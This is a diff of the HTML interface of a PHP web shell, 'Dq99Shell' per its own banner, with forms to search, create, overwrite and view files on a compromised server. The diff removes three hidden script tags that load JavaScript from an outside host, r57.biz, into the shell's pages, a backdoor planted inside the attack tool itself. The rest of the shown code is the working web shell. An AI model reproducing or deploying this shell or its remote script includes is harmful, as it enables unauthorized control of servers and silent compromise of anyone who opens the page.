@@ -2638,14 +2638,12 @@ function chg_arg(num,txt1,txt2) {
 <tr><td align=right>Search File:</td>
 <td><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>">
     <input type="text" name="search_name" size="29" value="(.*)"> <input type="checkbox" name="search_name_regexp" value="1" checked> regexp <input type=submit name=submit value="Search">
-    </form><SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
     </td></tr>
 <tr><td align=right>Create File:</td>
 <td><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">
     <input type="text" name="mkfile" size="70" value="<?php echo $dispd; ?>"> <input type="checkbox" name="overwrite" value="1" checked> Overwrite <input type=submit value="Create"> <?php echo $wdt; ?>
     </form></td></tr>
 <tr><td align=right>View File:</td>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <td><form method="POST"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
     <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> <input type=submit value="View">
     </form></td></tr>
@@ -3099,7 +3097,6 @@ $html_start = '
 <title>'.getenv("HTTP_HOST").' - '.sh_name().'</title>
 '.$style.'
 </head>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <body>
 <div class=bartitle><h4>'.sh_name().'</h4>.: r57.biz Dq99Shell :.</div>
 ';
